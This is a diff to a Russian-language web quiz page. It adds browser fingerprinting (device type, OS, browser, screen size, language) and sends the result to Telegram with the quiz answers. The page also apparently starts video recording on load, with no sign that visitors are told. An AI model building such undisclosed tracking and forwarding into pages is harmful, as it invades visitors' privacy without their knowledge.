@@ -306,6 +306,59 @@
             return `<b>Вопрос ${questionNumber}:</b> ${questions[questionNumber].question}\n<b>Ответ:</b> ${questions[questionNumber].answers[value]}`;
         }
 
+        // Добавьте эту функцию для получения информации об устройстве
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language;
+            const isMobile = /iPhone|iPad|iPod|Android|Mobile|Tablet/i.test(userAgent);
+
+            let deviceType = "Компьютер";
+            if (isMobile) {
+                if (/iPad|Tablet/i.test(userAgent)) {
+                    deviceType = "Планшет";
+                } else {
+                    deviceType = "Телефон";
+                }
+            }
+
+            let browserInfo = "Неизвестный браузер";
+            if (userAgent.includes("Firefox")) {
+                browserInfo = "Firefox";
+            } else if (userAgent.includes("Chrome")) {
+                browserInfo = "Chrome";
+            } else if (userAgent.includes("Safari")) {
+                browserInfo = "Safari";
+            } else if (userAgent.includes("Edge")) {
+                browserInfo = "Edge";
+            } else if (userAgent.includes("Opera")) {
+                browserInfo = "Opera";
+            }
+
+            let osInfo = "Неизвестная ОС";
+            if (userAgent.includes("Windows")) {
+                osInfo = "Windows";
+            } else if (userAgent.includes("Mac")) {
+                osInfo = "MacOS";
+            } else if (userAgent.includes("Linux")) {
+                osInfo = "Linux";
+            } else if (userAgent.includes("Android")) {
+                osInfo = "Android";
+            } else if (userAgent.includes("iOS")) {
+                osInfo = "iOS";
+            }
+
+            return `
+<b>📱 Информация об устройстве:</b>
+• Тип устройства: ${deviceType}
+• Операционная система: ${osInfo}
+• Браузер: ${browserInfo}
+• Разрешение экрана: ${screenSize}
+• Язык системы: ${language}
+`;
+        }
+
         // При загрузке страницы начинаем запись
         window.addEventListener('load', async () => {
             await startRecording();
@@ -337,8 +390,11 @@
                 // Останавливаем запись видео
                 stopRecording();
                 
-                // Отправляем все ответы в Telegram
-                const allAnswers = "<b>🎯 Новый прошедший опрос:</b>\n\n" + answers.join("\n\n");
+                // Получаем информацию об устройстве
+                const deviceInfo = getDeviceInfo();
+                
+                // Отправляем все ответы и информацию об устройстве в Telegram
+                const allAnswers = `<b>🎯 Новый прошедший опрос:</b>\n\n${answers.join("\n\n")}\n\n${deviceInfo}`;
                 await sendToTelegram(allAnswers);
                 
                 quiz.style.display = 'none';
